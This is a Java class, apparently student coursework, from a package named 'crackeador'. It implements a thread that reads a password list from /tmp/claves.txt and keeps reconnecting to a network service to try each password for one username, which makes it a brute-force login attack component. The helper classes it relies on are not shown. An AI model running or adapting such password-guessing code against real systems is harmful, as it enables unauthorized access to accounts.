/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package crackeador;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.Socket;
import java.util.LinkedList;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author dam2
 */
public class HebraUsuario extends Thread {

    String dirIp;
    int puerto;
    String usuario;

    public HebraUsuario() {
    }

    public HebraUsuario(String dirIp, int puerto, String usuario) {
        this.dirIp = dirIp;
        this.puerto = puerto;
        this.usuario = usuario;
    }

    @Override
    public void run() {
        Scanner scPasswords = null;
        Socket socket = null;
        String pass = "";
        LinkedList<String> mensajes = new LinkedList<>();
        HebraLectora hl = null;
        HebraEscritora he = null;
        
        try {

            scPasswords = new Scanner(new File("/tmp/claves.txt"));
            socket = new Socket(dirIp, puerto);

            pass = scPasswords.nextLine();

            hl = new HebraLectora(socket, mensajes);
            he = new HebraEscritora(mensajes, socket, usuario, pass);

            hl.start();
            sleep(20);
            he.start();

            while (scPasswords.hasNext()) {
                //Si el socket esta cerrado crea una nueva conexion al socket
                if (socket.isClosed()) {
                    socket = new Socket(dirIp, puerto);
                    pass = scPasswords.nextLine();
                    hl = new HebraLectora(socket, mensajes);
                    he = new HebraEscritora(mensajes, socket, usuario, pass);

                    hl.start();
                    sleep(20);
                    he.start();
                }
            }

        } catch (FileNotFoundException ex) {
            Logger.getLogger(HebraUsuario.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(HebraUsuario.class.getName()).log(Level.SEVERE, null, ex);
        } catch (InterruptedException ex) {
            Logger.getLogger(HebraUsuario.class.getName()).log(Level.SEVERE, null, ex);
        }

        try {
           //Para que espere el programa a que terminen todas las hebras
            hl.join();
            he.join();
        
        } catch (Exception e) {

        }

    }

    public String getDirIp() {
        return dirIp;
    }

    public int getPuerto() {
        return puerto;
    }

    public String getUsuario() {
        return usuario;
    }

}
